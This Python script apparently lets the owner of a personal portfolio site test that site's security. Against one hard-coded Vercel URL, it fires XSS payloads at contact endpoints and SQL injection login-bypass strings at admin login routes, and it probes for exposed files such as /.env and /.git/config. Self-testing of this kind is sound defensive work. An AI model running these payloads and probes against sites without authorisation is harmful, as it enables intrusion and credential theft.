#!/usr/bin/env python3

"""
Quick Security Test for: https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app/
Run this script from Kali Linux to perform rapid security assessment
"""

import requests
import json
import time
import sys
from urllib.parse import urljoin

TARGET_URL = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

class QuickSecurityTest:
    def __init__(self):
        self.session = requests.Session()
        self.findings = []
        
    def log_finding(self, severity, title, details):
        finding = {
            'severity': severity,
            'title': title,
            'details': details,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.findings.append(finding)
        
        # Color coding
        colors = {
            'CRITICAL': '\033[0;31m',  # Red
            'HIGH': '\033[0;33m',      # Yellow
            'MEDIUM': '\033[0;36m',    # Cyan
            'LOW': '\033[0;32m',       # Green
            'INFO': '\033[0;37m'       # White
        }
        reset = '\033[0m'
        
        color = colors.get(severity, reset)
        print(f"{color}[{severity}] {title}{reset}")
        print(f"    {details}")
        
    def test_security_headers(self):
        print("\n🔒 Testing Security Headers...")
        try:
            response = self.session.get(TARGET_URL, timeout=10)
            headers = response.headers
            
            # Critical security headers
            critical_headers = {
                'Content-Security-Policy': 'Missing CSP allows XSS attacks',
                'Strict-Transport-Security': 'Missing HSTS allows protocol downgrade attacks'
            }
            
            medium_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options allows clickjacking',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options allows MIME sniffing'
            }
            
            for header, description in critical_headers.items():
                if header not in headers:
                    self.log_finding('HIGH', f'Missing {header}', description)
                    
            for header, description in medium_headers.items():
                if header not in headers:
                    self.log_finding('MEDIUM', f'Missing {header}', description)
                    
        except Exception as e:
            self.log_finding('MEDIUM', 'Header Check Failed', f'Could not retrieve headers: {e}')
            
    def test_admin_endpoints(self):
        print("\n🔐 Testing Admin Endpoints...")
        
        admin_endpoints = [
            '/admin',
            '/admin/login',
            '/admin/dashboard', 
            '/admin/projects',
            '/admin/hero',
            '/admin/about',
            '/admin/skills',
            '/admin/contact',
            '/admin/messages',
            '/admin/media'
        ]
        
        accessible_admin = []
        
        for endpoint in admin_endpoints:
            try:
                url = urljoin(TARGET_URL, endpoint)
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Check if it contains admin content without login
                    admin_indicators = ['admin', 'dashboard', 'control panel', 'management']
                    login_indicators = ['login', 'sign in', 'authenticate']
                    
                    response_text = response.text.lower()
                    
                    has_admin_content = any(indicator in response_text for indicator in admin_indicators)
                    has_login_prompt = any(indicator in response_text for indicator in login_indicators)
                    
                    if has_admin_content and not has_login_prompt:
                        accessible_admin.append(endpoint)
                        self.log_finding('CRITICAL', 'Admin Panel Accessible', f'{endpoint} is accessible without authentication')
                    elif response.status_code == 200:
                        self.log_finding('INFO', 'Admin Endpoint Found', f'{endpoint} returns 200 status')
                        
            except Exception:
                continue
                
        if not accessible_admin:
            self.log_finding('INFO', 'Admin Security Check', 'No admin panels accessible without authentication')
            
    def test_contact_form_xss(self):
        print("\n📝 Testing Contact Form for XSS...")
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert(document.domain)</script>'
        ]
        
        contact_endpoints = ['/api/contact', '/contact', '/api/messages']
        
        for payload in xss_payloads[:2]:  # Test first 2 payloads
            for endpoint in contact_endpoints:
                try:
                    url = urljoin(TARGET_URL, endpoint)
                    data = {
                        'name': payload,
                        'email': 'test@test.com',
                        'message': 'XSS test'
                    }
                    
                    response = self.session.post(
                        url,
                        json=data,
                        headers={'Content-Type': 'application/json'},
                        timeout=5
                    )
                    
                    if response.status_code in [200, 201]:
                        if payload in response.text:
                            self.log_finding('HIGH', 'XSS Vulnerability Found', f'Payload reflected in {endpoint}')
                        else:
                            self.log_finding('INFO', 'Contact Form Working', f'{endpoint} accepts input (XSS not detected)')
                            
                except Exception:
                    continue
                    
    def test_authentication_bypass(self):
        print("\n🔓 Testing Authentication Bypass...")
        
        login_endpoints = ['/admin/login', '/api/auth/login']
        
        # Test SQL injection payloads
        sql_payloads = [
            "admin' OR '1'='1' --",
            "admin'/*"
        ]
        
        for endpoint in login_endpoints:
            for payload in sql_payloads:
                try:
                    url = urljoin(TARGET_URL, endpoint)
                    data = {
                        'email': payload,
                        'password': 'test123'
                    }
                    
                    response = self.session.post(
                        url,
                        json=data,
                        headers={'Content-Type': 'application/json'},
                        timeout=5
                    )
                    
                    # Check for successful login or database errors
                    response_text = response.text.lower()
                    
                    success_indicators = ['welcome', 'dashboard', 'token', 'success']
                    error_indicators = ['sql', 'syntax', 'database', 'query']
                    
                    if any(indicator in response_text for indicator in success_indicators):
                        self.log_finding('CRITICAL', 'Authentication Bypass', f'SQL injection may have bypassed login at {endpoint}')
                    elif any(indicator in response_text for indicator in error_indicators):
                        self.log_finding('HIGH', 'SQL Error Disclosure', f'Database error exposed at {endpoint}')
                        
                except Exception:
                    continue
                    
    def test_information_disclosure(self):
        print("\n🔍 Testing Information Disclosure...")
        
        sensitive_files = [
            '/.env',
            '/package.json',
            '/vercel.json',
            '/.git/config',
            '/config.json'
        ]
        
        for file_path in sensitive_files:
            try:
                url = urljoin(TARGET_URL, file_path)
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 10:
                    # Check for sensitive information
                    sensitive_patterns = ['password', 'secret', 'key', 'token', 'api_key']
                    content_lower = response.text.lower()
                    
                    if any(pattern in content_lower for pattern in sensitive_patterns):
                        self.log_finding('HIGH', 'Sensitive File Exposed', f'{file_path} contains sensitive information')
                    else:
                        self.log_finding('MEDIUM', 'Configuration File Exposed', f'{file_path} is accessible')
                        
            except Exception:
                continue
                
    def test_basic_ssl(self):
        print("\n🔐 Testing Basic SSL/HTTPS...")
        
        try:
            # Test HTTP redirect
            http_url = TARGET_URL.replace('https://', 'http://')
            response = self.session.get(http_url, timeout=5, allow_redirects=False)
            
            if response.status_code in [301, 302, 308]:
                if 'https' in response.headers.get('Location', ''):
                    self.log_finding('INFO', 'HTTPS Redirect', 'HTTP properly redirects to HTTPS')
                else:
                    self.log_finding('MEDIUM', 'Insecure Redirect', 'HTTP does not redirect to HTTPS')
            else:
                self.log_finding('MEDIUM', 'HTTP Accessible', 'Site accessible over HTTP')
                
        except Exception:
            self.log_finding('INFO', 'HTTPS Only', 'Site appears to be HTTPS only')
            
    def generate_report(self):
        print("\n" + "="*60)
        print("📊 SECURITY ASSESSMENT SUMMARY")
        print("="*60)
        
        # Count findings by severity
        severity_counts = {}
        for finding in self.findings:
            severity = finding['severity']
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
            
        print(f"Target: {TARGET_URL}")
        print(f"Assessment Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Findings: {len(self.findings)}")
        print()
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            count = severity_counts.get(severity, 0)
            if count > 0:
                print(f"{severity}: {count} findings")
                
        # Show critical and high findings
        critical_high = [f for f in self.findings if f['severity'] in ['CRITICAL', 'HIGH']]
        
        if critical_high:
            print("\n🚨 PRIORITY ISSUES:")
            for finding in critical_high:
                print(f"- [{finding['severity']}] {finding['title']}")
                
        print("\n📋 RECOMMENDATIONS:")
        if any(f['severity'] == 'CRITICAL' for f in self.findings):
            print("- IMMEDIATE: Address critical security issues")
        if any('Missing' in f['title'] for f in self.findings):
            print("- Add missing security headers")
        if any('XSS' in f['title'] for f in self.findings):
            print("- Implement input validation and output encoding")
        if any('Authentication' in f['title'] for f in self.findings):
            print("- Review authentication and authorization controls")
            
        print("\n✅ Assessment Complete!")
        
    def run_all_tests(self):
        print(f"🚀 Starting Quick Security Assessment")
        print(f"Target: {TARGET_URL}")
        print("="*60)
        
        try:
            self.test_security_headers()
            self.test_admin_endpoints()
            self.test_contact_form_xss()
            self.test_authentication_bypass()
            self.test_information_disclosure()
            self.test_basic_ssl()
            
            self.generate_report()
            
        except KeyboardInterrupt:
            print("\n⏹️  Assessment interrupted by user")
        except Exception as e:
            print(f"\n❌ Assessment failed: {e}")

if __name__ == "__main__":
    print("Portfolio Security Quick Test")
    print("Target: https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app/")
    print()
    
    tester = QuickSecurityTest()
    tester.run_all_tests()